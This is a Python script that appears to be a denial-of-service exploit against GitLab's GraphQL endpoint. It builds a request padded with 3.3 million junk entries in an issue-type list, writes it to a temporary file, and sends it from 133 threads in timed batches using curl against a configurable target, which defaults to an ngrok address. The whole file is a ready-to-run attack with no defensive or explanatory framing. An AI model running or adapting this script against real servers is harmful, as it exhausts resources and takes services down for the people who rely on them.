import subprocess
import json
import threading
import time
import argparse
import tempfile
import os

# Command-line arguments
parser = argparse.ArgumentParser(description="Run concurrent GraphQL requests using curl.")
parser.add_argument("--domain", required=False, default="https://508b4ca0c8d2.ngrok-free.app", help="GitLab Instance Domain (e.g., https://gitlab.example.com)")
parser.add_argument("--threads", type=int, default=133, help="Total number of threads")
parser.add_argument("--delay", type=float, default=1.0, help="Delay between thread starts in seconds")
parser.add_argument("--batch-delay", type=float, default=9.0, help="Delay after each batch of threads in seconds")
parser.add_argument("--batch-size", type=int, default=9, help="Number of threads in a batch before applying batch delay")
args = parser.parse_args()

# Construct the full GraphQL endpoint URL
GRAPHQL_ENDPOINT = f"{args.domain.rstrip('/')}/api/graphql"
print(f"\n🔗 Using GraphQL endpoint: {GRAPHQL_ENDPOINT}")

PAYLOAD_SIZE = 3300000
print(f"📦 Payload 'types' list size: {PAYLOAD_SIZE} elements")

# Estimate payload size in MB
dummy_payload = {
    "query": "query",
    "variables": {
        "types": ["ISSUE", "TASK"] + ["." for _ in range(PAYLOAD_SIZE)]
    },
    "operationName": "getIssues"
}
payload_size_bytes = len(json.dumps(dummy_payload).encode("utf-8"))
print(f"📏 Estimated payload size: {payload_size_bytes / (1024 * 1024):.2f} MB\n")

# GraphQL query
query = """
query getIssues($fullPath: ID!, $first: Int, $state: IssuableState, $sort: IssueSort, $types: [IssueType!]) {
  project(fullPath: $fullPath) {
    issues(first: $first, state: $state, sort: $sort, types: $types) {
      nodes {
        id
        iid
        title
        state
        webUrl
        createdAt
        author {
          username
        }
      }
      pageInfo {
        hasNextPage
        endCursor
      }
    }
  }
}
"""

variables = {
    "fullPath": "1xxxxxxxx1xx123/xxxxxxx1xxxxxxx123",
    "first": 20,
    "state": "opened",
    "sort": "CREATED_DESC",
    "types": ["ISSUE", "TASK"] + ["." for _ in range(PAYLOAD_SIZE)]
}

# Write the payload to a temp file once and reuse it
temp_payload_file = tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".json")
json.dump({
    "query": query,
    "variables": variables,
    "operationName": "getIssues"
}, temp_payload_file)
temp_payload_file.close()
print(f"📄 Payload written to temporary file: {temp_payload_file.name}")

def make_request(thread_id):
    try:
        print(f"🚀 [Thread {thread_id}] Starting request...")
        curl_command = [
            "curl", "-k", "-s", "-X", "POST", GRAPHQL_ENDPOINT,
            "-H", "Content-Type: application/json",
            f"-d@{temp_payload_file.name}"
        ]

        result = subprocess.run(curl_command, capture_output=True, text=True)
        if result.returncode == 0:
            try:
                data = json.loads(result.stdout)
                print(f"✅ [Thread {thread_id}] Success - Partial JSON:\n{json.dumps(data, indent=2)[:400]}...\n")
            except json.JSONDecodeError:
                print(f"❌ [Thread {thread_id}] Invalid JSON Response:\n{result.stdout[:300]}")
        else:
            print(f"❌ [Thread {thread_id}] Curl Error:\n{result.stderr}")
    except Exception as e:
        print(f"🔥 [Thread {thread_id}] Exception: {str(e)}")

# Threading logic
threads = []
for i in range(args.threads):
    print(f"\n🧵 Creating thread {i}")
    t = threading.Thread(target=make_request, args=(i,))
    t.start()
    threads.append(t)

    if (i + 1) % args.batch_size == 0:
        print(f"⏸️ Batch limit reached. Sleeping for {args.batch_delay} seconds...")
        time.sleep(args.batch_delay)

    print(f"⏱️ Sleeping for {args.delay} seconds before next thread...")
    time.sleep(args.delay)

# Wait for all threads to complete
for t in threads:
    t.join()

# Clean up
os.remove(temp_payload_file.name)
print(f"\n🧹 Removed temporary file: {temp_payload_file.name}")
print("✅ All threads completed.")
input("Press Enter to exit...")
time.sleep(100)
